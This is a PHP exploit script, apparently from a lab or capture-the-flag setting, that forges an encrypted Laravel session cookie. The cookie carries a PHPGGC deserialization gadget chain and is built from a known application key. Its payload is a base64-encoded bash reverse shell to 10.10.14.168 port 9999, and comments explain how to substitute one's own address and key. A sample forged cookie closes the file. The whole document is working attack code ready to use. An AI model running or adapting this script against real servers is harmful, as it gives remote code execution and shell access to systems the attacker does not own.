<?php
$cipher = 'AES-256-CBC';
$app_key = 'base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=';    // CHANGE THIS
$chain_name = 'Laravel/RCE6';
$payload = 'system(\'echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNjgvOTk5OSAwPiYx | base64 --decode | /usr/bin/bash\');';
// YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNjgvOTk5OSAwPiYx  => bash -i >& /dev/tcp/10.10.14.168/9999 0>&1  => CHANGE THIS, BASE64 ENCODE IT AND THEN REPLACE IT WITH THE ONE IN THE PAYLOAD VARIALE.

// Use PHPGGC to generate the gadget chain. It can be downloaded from https://github.com/ambionics/phpggc 
$chain = shell_exec('./phpggc/phpggc '.$chain_name.' "'.$payload.'"');
// Key can be stored as base64 or string.
if( explode(":", $app_key)[0] === 'base64' ) {
 $app_key = base64_decode(explode(':', $app_key)[1]);
}
// Create cookie
$iv = random_bytes(openssl_cipher_iv_length($cipher));
$value = \openssl_encrypt($chain, $cipher, $app_key, 0, $iv);
$iv = base64_encode($iv);
$mac = hash_hmac('sha256', $iv.$value, $app_key);
$json = json_encode(compact('iv', 'value', 'mac'));

// Printing the cookie in base64 encoding format
die(base64_encode($json));

// Output Example:
// eyJpdiI6ImdCTEh6XC9vb3pqRlpZUVoyZmFiSXVnPT0iLCJ2YWx1ZSI6ImVtdUVUNytKWE1uelQxSjlvdEx5V0VjeElySjlKU29PRWxnWlA3SVY0NDZxalhoVnRjK2xNOVNTK2RXZnl5OHIwQkQ0TDdVckd0SlJ6SHJjanJhMVNkSStLQk52XC9ReFJcL1dtM0l6OTlhNFFLREFuQ0dqeGJldlVVSUpyZmpQWlVBVkZzMkpjMVo5M2U2K0MzMkhOZXFIdXFQMDRlODM4d2dwWWhhaVVKZzZUdVgwSkFhbXFTb2ExWFcwcUhLYllGQTVYOG1oNWdcL0tSWlFBUVozOVdhMlpsTWM3THhhYzNCUE50MWhjVlwvMTdNWWFRMzdyZUVyWDJkY3IweWtWcDI1U1dNa2toSW16eE5oMnNPTlNEWW41Vk54ZzhtXC9UUHpoU3p6Y3RVdTJYZDF1cGY2ZXlUQ0pqclY3ZzkxNkVWOEswSUVQSFNPb3B3TkFwd3FIZzZ2WWpWYWUybHlBTnVaaFFMWStKZmdGXC9mbFo0ell2MVV5NnFTcWpcL2NUWXVkVEtLR2F0aGlYN2F6U1I5UjVtRm5rWUY3ZU83Qk8rVlwvRTBjZnc5ZkJWR1YyVmRrZmRDS0V0aXFRMmR6WWZTR1hoVjhDQWd5N1NlZG1LOFFYV2U0bW4zR2d6d21QbVJjU0dxUmFcL3JQT0RBd0pEZW80anRWa1lkendPeE9McGFNTHpoT1l4QU9wOWNxQVZkYnpZc0ZOY0JDSWZWTnIxQ0hYcGxVZzEyQkRwNjRwd0Yzc3ZVTnk0MEN2TFJkTmVYNE9YTkZ6aGY5N240YitHNm9kZlB5WDZhNUxHMFdGaHZxbWMxWE52SXVZeXBpXC85V2dHQTlqWXJpSjkrVit1bmE3V2UrVjdLbG1wYlo4OTM4aTlYNmF3Nm9FWHR4NUg2RnZEenZqcmxzbzVLcjhnOStlYzVIY1pZWTZPbUZmWWIrOVlKTmNDalhKVXRvRjQwbkdDQzBFbmNMZitiZlwvRmpPUkZQRjZDSFhYZU1oRGFsZVNXdWhMekN6WjBhMGt2R2M5Q0Z5bm1EK29vWHJUblhaanlrdXdUWXltXC9jQ0ZKNWk5NXNlSDhUYkVUQ25nQnNFUEJtUW1RTWZmZWtaQVRZWVBFMlE0aEZSUm1NNXQ5cXViVUlWb1dHQk9BPT0iLCJtYWMiOiJkNzU0MjI4ZGM0Zjk2YTQzZWZmY2U3OGRmY2E4OTI5NzVlYjRiY2IyNzkzNGZkMzA3MjM1MWUxNGNkYmRiNmNiIn0=
